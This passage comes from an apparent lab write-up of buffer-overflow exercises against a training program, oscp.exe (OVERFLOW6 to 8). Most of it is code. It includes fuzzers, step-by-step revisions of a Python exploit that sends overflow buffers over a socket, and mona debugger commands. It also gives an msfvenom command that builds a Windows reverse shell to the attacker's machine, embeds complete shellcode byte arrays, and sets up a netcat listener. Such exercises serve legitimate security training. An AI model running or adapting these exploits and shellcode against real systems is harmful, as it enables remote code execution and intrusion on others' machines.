g3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk"
	postfix = ""

	buffer = prefix + overflow + retn + padding + payload + postfix

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	try:
		s.connect((ip, port))
		print("Sending evil buffer...")
		s.send(bytes(buffer + "\r\n", "latin-1"))
		print("Done!")
	except:
 		print("Could not connect.")
except:
    print ("\nCould not connect!")
    sys.exit()
```

On kail run the exploit again then in mona run the following to get the offset for EIP. We were able to find the offset was 1034.

**Kali**

```
python exploit.py $VICTIM 1337
```

**Immunity Debugger**

```
!mona findmsp -distance 1100
```

<figure><img src="../../.gitbook/assets/image (43).png" alt=""><figcaption></figcaption></figure>

**exploit.py - Code Changes #2**

```
import socket, time, sys

try:
	ip = str(sys.argv[1])
	port = int(sys.argv[2])
	print (ip+":"+str(port))

	prefix = "OVERFLOW6 "
	offset = 1034
	overflow = "A" * offset
	retn = "BBBB"
	padding = ""
	payload = ""
	postfix = ""

	buffer = prefix + overflow + retn + padding + payload + postfix

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	try:
		s.connect((ip, port))
		print("Sending evil buffer...")
		s.send(bytes(buffer + "\r\n", "latin-1"))
		print("Done!")
	except:
 		print("Could not connect.")
except:
    print ("\nCould not connect!")
    sys.exit()
```

**Kali**

After running the program again we now can fill EIP with our Bs so we now have control of EIP.

```
python exploit.py $VICTIM 1337
```

<figure><img src="../../.gitbook/assets/image (11) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Finding Bad Characters

**Kali**

Now we changed the program to look for bad characters so we don't later use those bad characters when generating our payload. We do this by setting our payload to all possible characters, than follow EIP to see which characters aren't showing up. To do this we just have to keep running our exploit and removing the bad characters one by one. The bad characters found were: \x00\x08\x2c\xad

```
python exploit.py $VICTIM 1337
```

#### **exploit.py - Code Changes #3**

```
import socket, time, sys

#Bad chars found: \x00\x08\x2c\xad
badChars = (
"\x01\x02\x03\x04\x05\x06\x07\x09\x0a\x0b\x0c\x0d\x0e\x0f"
"\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2d\x2e\x2f"
"\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f"
"\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f"
"\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f"
"\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xae\xaf"
"\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf"
"\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef"
"\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)

try:
	ip = str(sys.argv[1])
	port = int(sys.argv[2])
	print (ip+":"+str(port))

	prefix = "OVERFLOW6 "
	offset = 1034
	overflow = "A" * offset
	retn = "BBBB"
	padding = ""
	payload = badChars
	postfix = ""

	buffer = prefix + overflow + retn + padding + payload + postfix

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	try:
		s.connect((ip, port))
		print("Sending evil buffer...")
		s.send(bytes(buffer + "\r\n", "latin-1"))
		print("Done!")
	except:
 		print("Could not connect.")
except:
    print ("\nCould not connect!")
    sys.exit()
```

<figure><img src="../../.gitbook/assets/image (12) (7) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (53).png" alt=""><figcaption></figcaption></figure>

### Finding a Jump Point

Now we need to find a place to jump to to run our payload.  We find there is only one place that will meets our conditions that we need which is an address with  SafeSEH, ASLR, and NXCompat disabled and the  memory address doesn't start with 0x00. ex: 0x0040000 won't work, 0x100000 will work. essfunc.dll meets this criteria.&#x20;

**Immunity Debugger**

```
!mona modules
```

<figure><img src="../../.gitbook/assets/image (51).png" alt=""><figcaption></figcaption></figure>

We find that essfunc.dll has 9 possible JMP ESPs to use. So we will start with the first one which is 0x625011af but when we add it to our code we need it in little endian format so it becomes \xaf\x11\x50\x62.

**Immunity Debugger**

```
!mona find -s "\xff\xe4" -m essfunc.dll
```

<figure><img src="../../.gitbook/assets/image (10) (2).png" alt=""><figcaption></figcaption></figure>

### Exploit

Now that we have the return address to use, we just need to generate our payload without using the bad characters found previously. I also added 16 NOPs before the payload as suggested in the room. All that is left is to is to update our code with our payload and run it against the program. &#x20;

```
msfvenom -p windows/shell_reverse_tcp LHOST=$KALI LPORT=4444 EXITFUNC=thread -b "\x00\x08\x2c\xad" -f c
```

#### **exploit.py - Code Changes #4**

```
import socket, time, sys

try:
	ip = str(sys.argv[1])
	port = int(sys.argv[2])
	print (ip+":"+str(port))

	prefix = "OVERFLOW6 "
	offset = 1034
	overflow = "A" * offset
	retn = "\xaf\x11\x50\x62"
	padding = "\x90" * 16
	payload = ("\xbb\x27\xa1\x7d\x44\xda\xcb\xd9\x74\x24\xf4\x5a\x33\xc9\xb1"
"\x52\x31\x5a\x12\x83\xea\xfc\x03\x7d\xaf\x9f\xb1\x7d\x47\xdd"
"\x3a\x7d\x98\x82\xb3\x98\xa9\x82\xa0\xe9\x9a\x32\xa2\xbf\x16"
"\xb8\xe6\x2b\xac\xcc\x2e\x5c\x05\x7a\x09\x53\x96\xd7\x69\xf2"
"\x14\x2a\xbe\xd4\x25\xe5\xb3\x15\x61\x18\x39\x47\x3a\x56\xec"
"\x77\x4f\x22\x2d\xfc\x03\xa2\x35\xe1\xd4\xc5\x14\xb4\x6f\x9c"
"\xb6\x37\xa3\x94\xfe\x2f\xa0\x91\x49\xc4\x12\x6d\x48\x0c\x6b"
"\x8e\xe7\x71\x43\x7d\xf9\xb6\x64\x9e\x8c\xce\x96\x23\x97\x15"
"\xe4\xff\x12\x8d\x4e\x8b\x85\x69\x6e\x58\x53\xfa\x7c\x15\x17"
"\xa4\x60\xa8\xf4\xdf\x9d\x21\xfb\x0f\x14\x71\xd8\x8b\x7c\x21"
"\x41\x8a\xd8\x84\x7e\xcc\x82\x79\xdb\x87\x2f\x6d\x56\xca\x27"
"\x42\x5b\xf4\xb7\xcc\xec\x87\x85\x53\x47\x0f\xa6\x1c\x41\xc8"
"\xc9\x36\x35\x46\x34\xb9\x46\x4f\xf3\xed\x16\xe7\xd2\x8d\xfc"
"\xf7\xdb\x5b\x52\xa7\x73\x34\x13\x17\x34\xe4\xfb\x7d\xbb\xdb"
"\x1c\x7e\x11\x74\xb6\x85\xf2\x71\x4d\x17\xf1\xee\x53\x17\xe7"
"\xb2\xda\xf1\x6d\x5b\x8b\xaa\x19\xc2\x96\x20\xbb\x0b\x0d\x4d"
"\xfb\x80\xa2\xb2\xb2\x60\xce\xa0\x23\x81\x85\x9a\xe2\x9e\x33"
"\xb2\x69\x0c\xd8\x42\xe7\x2d\x77\x15\xa0\x80\x8e\xf3\x5c\xba"
"\x38\xe1\x9c\x5a\x02\xa1\x7a\x9f\x8d\x28\x0e\x9b\xa9\x3a\xd6"
"\x24\xf6\x6e\x86\x72\xa0\xd8\x60\x2d\x02\xb2\x3a\x82\xcc\x52"
"\xba\xe8\xce\x24\xc3\x24\xb9\xc8\x72\x91\xfc\xf7\xbb\x75\x09"
"\x80\xa1\xe5\xf6\x5b\x62\x05\x15\x49\x9f\xae\x80\x18\x22\xb3"
"\x32\xf7\x61\xca\xb0\xfd\x19\x29\xa8\x74\x1f\x75\x6e\x65\x6d"
"\xe6\x1b\x89\xc2\x07\x0e"
)
	postfix = ""

	buffer = prefix + overflow + retn + padding + payload + postfix

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	try:
		s.connect((ip, port))
		print("Sending evil buffer...")
		s.send(bytes(buffer + "\r\n", "latin-1"))
		print("Done!")
	except:
 		print("Could not connect.")
except:
    print ("\nCould not connect!")
    sys.exit()
```

**Kali #1**

```
nc -lvnp 4444
```

**Kali #2**

```
python exploit.py $VICTIM 1337
```

<figure><img src="../../.gitbook/assets/image (52).png" alt=""><figcaption></figcaption></figure>

## oscp.exe - OVERFLOW7

#### fuzzer.py

Slightly modified version of the script given.

```
#!/usr/bin/env python3

import socket, time, sys

try:
	ip = str(sys.argv[1])
	port = int(sys.argv[2])
	print (ip+":"+str(port))
	timeout = 5
	prefix = "OVERFLOW7 "
	string = prefix + "A" * 100

	while True:
		try:
			with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
				s.settimeout(timeout)
				s.connect((ip, port))
				s.recv(1024)
				print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
				s.send(bytes(string, "latin-1"))
				s.recv(1024)
		except:
			print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
			sys.exit(0)
		string += 100 * "A"
		time.sleep(1)

except:
    print ("\nCould not connect!")
    sys.exit()

```

**exploit.py**

Slightly modified version of the script given.

```
import socket, time, sys

try:
	ip = str(sys.argv[1])
	port = int(sys.argv[2])
	print (ip+":"+str(port))

	prefix = "OVERFLOW7 "
	offset = 0
	overflow = "A" * offset
	retn = ""
	padding = ""
	payload = ""
	postfix = ""

	buffer = prefix + overflow + retn + padding + payload + postfix

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	try:
		s.connect((ip, port))
		print("Sending evil buffer...")
		s.send(bytes(buffer + "\r\n", "latin-1"))
		print("Done!")
	except:
 		print("Could not connect.")
except:
    print ("\nCould not connect!")
    sys.exit()
```

**Kali**

Login the the Windows box then open the oscp.exe within Immunity Debugger. Press the play button to start the program.

```
xfreerdp /u:admin /p:password /cert:ignore /v:$VICTIM /workarea
```

### **Crash Replication & Controlling EIP**

```
python fuzzer.py $VICTIM 1337
```

Program crashed at 1400 bytes with fuzzer.py

<figure><img src="../../.gitbook/assets/image (33).png" alt=""><figcaption></figcaption></figure>

```
/opt/metasploit-framework-5101/tools/exploit/pattern_create.rb -l 1400
```

#### **exploit.py - Code Changes #1**

I added the pattern\_create output into the payload variable.

```
import socket, time, sys

try:
	ip = str(sys.argv[1])
	port = int(sys.argv[2])
	print (ip+":"+str(port))

	prefix = "OVERFLOW7 "
	offset = 0
	overflow = "A" * offset
	retn = ""
	padding = ""
	payload = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu"
	postfix = ""

	buffer = prefix + overflow + retn + padding + payload + postfix

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	try:
		s.connect((ip, port))
		print("Sending evil buffer...")
		s.send(bytes(buffer + "\r\n", "latin-1"))
		print("Done!")
	except:
 		print("Could not connect.")
except:
    print ("\nCould not connect!")
    sys.exit()
```

On kail run the exploit again then in mona run the following to get the offset for EIP. We were able to find the offset was 1306.

**Kali**

```
python exploit.py $VICTIM 1337
```

**Immunity Debugger**

```
!mona findmsp -distance 1400
```

<figure><img src="../../.gitbook/assets/image (42).png" alt=""><figcaption></figcaption></figure>

**exploit.py - Code Changes #2**

```
import socket, time, sys

try:
	ip = str(sys.argv[1])
	port = int(sys.argv[2])
	print (ip+":"+str(port))

	prefix = "OVERFLOW7 "
	offset = 1306
	overflow = "A" * offset
	retn = "BBBB"
	padding = ""
	payload = ""
	postfix = ""

	buffer = prefix + overflow + retn + padding + payload + postfix

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	try:
		s.connect((ip, port))
		print("Sending evil buffer...")
		s.send(bytes(buffer + "\r\n", "latin-1"))
		print("Done!")
	except:
 		print("Could not connect.")
except:
    print ("\nCould not connect!")
    sys.exit()
```

**Kali**

After running the program again we now can fill EIP with our Bs so we now have control of EIP.

```
python exploit.py $VICTIM 1337
```

<figure><img src="../../.gitbook/assets/image (1) (7) (1).png" alt=""><figcaption></figcaption></figure>

### Finding Bad Characters

**Kali**

Now we changed the program to look for bad characters so we don't later use those bad characters when generating our payload. We do this by setting our payload to all possible characters, than follow EIP to see which characters aren't showing up. To do this we just have to keep running our exploit and removing the bad characters one by one. The bad characters found were: \x00\x8c\xae\xbe\xfb

```
python exploit.py $VICTIM 1337
```

#### **exploit.py - Code Changes #3**

```
import socket, time, sys

#Bad chars found: \x00\x8c\xae\xbe\xfb
badChars = (
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f"
"\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f"
"\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f"
"\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f"
"\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8d\x8e\x8f"
"\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xaf"
"\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf"
"\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef"
"\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfc\xfd\xfe\xff"
)

try:
	ip = str(sys.argv[1])
	port = int(sys.argv[2])
	print (ip+":"+str(port))

	prefix = "OVERFLOW7 "
	offset = 1306
	overflow = "A" * offset
	retn = "BBBB"
	padding = ""
	payload = badChars
	postfix = ""

	buffer = prefix + overflow + retn + padding + payload + postfix

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	try:
		s.connect((ip, port))
		print("Sending evil buffer...")
		s.send(bytes(buffer + "\r\n", "latin-1"))
		print("Done!")
	except:
 		print("Could not connect.")
except:
    print ("\nCould not connect!")
    sys.exit()
```

<figure><img src="../../.gitbook/assets/image (13) (2).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (3) (6).png" alt=""><figcaption></figcaption></figure>

### Finding a Jump Point

Now we need to find a place to jump to to run our payload.  We find there is only one place that will meets our conditions that we need which is an address with  SafeSEH, ASLR, and NXCompat disabled and the  memory address doesn't start with 0x00. ex: 0x0040000 won't work, 0x100000 will work. essfunc.dll meets this criteria.&#x20;

**Immunity Debugger**

```
!mona modules
```

<figure><img src="../../.gitbook/assets/image (27) (1).png" alt=""><figcaption></figcaption></figure>

We find that essfunc.dll has 9 possible JMP ESPs to use. So we will start with the first one which is 0x625011af but when we add it to our code we need it in little endian format so it becomes \xaf\x11\x50\x62.

**Immunity Debugger**

```
!mona find -s "\xff\xe4" -m essfunc.dll
```

<figure><img src="../../.gitbook/assets/image (38).png" alt=""><figcaption></figcaption></figure>

### Exploit

Now that we have the return address to use, we just need to generate our payload without using the bad characters found previously. I also added 16 NOPs before the payload as suggested in the room. All that is left is to is to update our code with our payload and run it against the program.&#x20;

#### **exploit.py - Code Changes #4**

```
import socket, time, sys

try:
	ip = str(sys.argv[1])
	port = int(sys.argv[2])
	print (ip+":"+str(port))

	prefix = "OVERFLOW7 "
	offset = 1306
	overflow = "A" * offset
	retn = "\xaf\x11\x50\x62"
	padding = "\x90" * 16
	payload = ("\x31\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e"
"\x36\xa9\x76\x3e\x83\xee\xfc\xe2\xf4\xca\x41\xf4\x3e\x36\xa9"
"\x16\xb7\xd3\x98\xb6\x5a\xbd\xf9\x46\xb5\x64\xa5\xfd\x6c\x22"
"\x22\x04\x16\x39\x1e\x3c\x18\x07\x56\xda\x02\x57\xd5\x74\x12"
"\x16\x68\xb9\x33\x37\x6e\x94\xcc\x64\xfe\xfd\x6c\x26\x22\x3c"
"\x02\xbd\xe5\x67\x46\xd5\xe1\x77\xef\x67\x22\x2f\x1e\x37\x7a"
"\xfd\x77\x2e\x4a\x4c\x77\xbd\x9d\xfd\x3f\xe0\x98\x89\x92\xf7"
"\x66\x7b\x3f\xf1\x91\x96\x4b\xc0\xaa\x0b\xc6\x0d\xd4\x52\x4b"
"\xd2\xf1\xfd\x66\x12\xa8\xa5\x58\xbd\xa5\x3d\xb5\x6e\xb5\x77"
"\xed\xbd\xad\xfd\x3f\xe6\x20\x32\x1a\x12\xf2\x2d\x5f\x6f\xf3"
"\x27\xc1\xd6\xf6\x29\x64\xbd\xbb\x9d\xb3\x6b\xc1\x45\x0c\x36"
"\xa9\x1e\x49\x45\x9b\x29\x6a\x5e\xe5\x01\x18\x31\x56\xa3\x86"
"\xa6\xa8\x76\x3e\x1f\x6d\x22\x6e\x5e\x80\xf6\x55\x36\x56\xa3"
"\x6e\x66\xf9\x26\x7e\x66\xe9\x26\x56\xdc\xa6\xa9\xde\xc9\x7c"
"\xe1\x54\x33\xc1\x7c\x34\x66\x58\x1e\x3c\x36\xb8\x2a\xb7\xd0"
"\xc3\x66\x68\x61\xc1\xef\x9b\x42\xc8\x89\xeb\xb3\x69\x02\x32"
"\xc9\xe7\x7e\x4b\xda\xc1\x86\x8b\x94\xff\x89\xeb\x5e\xca\x1b"
"\x5a\x36\x20\x95\x69\x61\xfe\x47\xc8\x5c\xbb\x2f\x68\xd4\x54"
"\x10\xf9\x72\x8d\x4a\x3f\x37\x24\x32\x1a\x26\x6f\x76\x7a\x62"
"\xf9\x20\x68\x60\xef\x20\x70\x60\xff\x25\x68\x5e\xd0\xba\x01"
"\xb0\x56\xa3\xb7\xd6\xe7\x20\x78\xc9\x99\x1e\x36\xb1\xb4\x16"
"\xc1\xe3\x12\x96\x23\x1c\xa3\x1e\x98\xa3\x14\xeb\xc1\xe3\x95"
"\x70\x42\x3c\x29\x8d\xde\x43\xac\xcd\x79\x25\xdb\x19\x54\x36"
"\xfa\x89\xeb")
	postfix = ""

	buffer = prefix + overflow + retn + padding + payload + postfix

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	try:
		s.connect((ip, port))
		print("Sending evil buffer...")
		s.send(bytes(buffer + "\r\n", "latin-1"))
		print("Done!")
	except:
 		print("Could not connect.")
except:
    print ("\nCould not connect!")
    sys.exit()
```

**Kali #1**

```
nc -lvnp 4444
```

**Kali #2**

```
python exploit.py $VICTIM 1337
```

<figure><img src="../../.gitbook/assets/image (41).png" alt=""><figcaption></figcaption></figure>

## oscp.exe - OVERFLOW8

#### fuzzer.py

Slightly modified version of the script given.

```
#!/usr/bin/env python3

import socket, time, sys

try:
	ip = str(sys.argv[1])
	port = int(sys.argv[2])
	print (ip+":"+str(port))
	timeout = 5
	prefix = "OVERFLOW8 "
	string = prefix + "A" * 100

	while True:
		try:
			with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
				s.settimeout(timeout)
				s.connect((ip, port))
				s.recv(1024)
				print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
				s.send(bytes(string, "latin-1"))
				s.recv(1024)
		except:
			print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
			sys.exit(0)
		string += 100 * "A"
		time.sleep(1)

except:
    print ("\nCould not connect!")
    sys.exit()

```



#### exploit.py

Slightly modified version of the script given.

```
import socket, time, sys

try:
	ip = str(sys.argv[1])
	port = int(sys.argv[2])
	print (ip+":"+str(port))

	prefix = "OVERFLOW8 "
	offset = 0
	overflow = "A" * offset
	retn = ""
	padding = ""
	payload = ""
	postfix = ""

	buffer = prefix + overflow + retn + padding + payload + postfix

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	try:
		s.connect((ip, port))
		print("Sending evil buffer...")
		s.send(bytes(buffer + "\r\n", "latin-1"))
		print("Done!")
	except:
 		print("Could not connect.")
except:
    print ("\nCould not connect!")
    sys.exit()
```

**Kali**

Login the the Windows box then open the oscp.exe within Immunity Debugger. Press the play button to start the program.

```
xfreerdp /u:admin /p:password /cert:ignore /v:$VICTIM /workarea
```

### **Crash Replication & Controlling EIP**

```
python fuzzer.py $VICTIM 1337
```

Program crashed at 1800 bytes with fuzzer.py

<figure><img src="../../.gitbook/assets/image (29) (2).png" alt=""><figcaption></figcaption></figure>

```
/opt/metasploit-framework-5101/tools/exploit/pattern_create.rb -l 1800
```



#### **exploit.py - Code Changes #1**

I added the pattern\_create output into the payload variable.

```
import socket, time, sys

try:
	ip = str(sys.argv[1])
	port = int(sys.argv[2])
	print (ip+":"+str(port))

	prefix = "OVERFLOW8 "
	offset = 0
	overflow = "A" * offset
	retn = ""
	padding = ""
	payload = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2